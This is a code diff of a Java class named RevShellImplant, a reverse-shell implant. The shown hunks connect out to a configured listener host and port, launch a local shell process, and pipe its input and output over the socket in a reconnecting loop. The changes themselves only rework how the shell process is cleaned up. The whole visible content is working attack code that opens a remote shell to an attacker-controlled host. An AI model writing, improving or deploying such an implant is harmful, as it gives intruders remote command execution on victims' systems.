@@ -85,15 +85,14 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
 
         while (!Thread.interrupted()) {
             log("[$] Connecting to " + CONF_LHOST + ":" + CONF_LPORT + "...");
-            Process shell = null;
             try (Socket connection = new Socket(CONF_LHOST, CONF_LPORT);
-                 InputStream fromRemote = connection.getInputStream();
-                 OutputStream toRemote = connection.getOutputStream()
+                InputStream fromRemote = connection.getInputStream();
+                OutputStream toRemote = connection.getOutputStream();
             ) {
                 log("[+] Connected to " + CONF_LHOST + ":" + CONF_LPORT + "!");
 
                 String shellCommandExecStr = shellCommand.get().toAbsolutePath().toString();
-                shell = new ProcessBuilder()
+                Process shell = new ProcessBuilder()
                         .command(shellCommandExecStr)
                         .redirectErrorStream(true)
                         .start();
@@ -116,6 +115,8 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
                 log("[ ] Waiting...");
                 pipe1.join();
                 pipe2.join();
+
+                shell.destroy();
                 log("[ ] Terminated.");
             } catch (IOException e) {
                 log("[!] " + e.getClass().getName() + ": " + e.getMessage());
@@ -126,10 +127,6 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
                 }
             } catch (InterruptedException ignored) {
                 Thread.currentThread().interrupt();
-            } finally {
-                if (shell != null) {
-                    shell.destroy();
-                }
             }
         }
     }
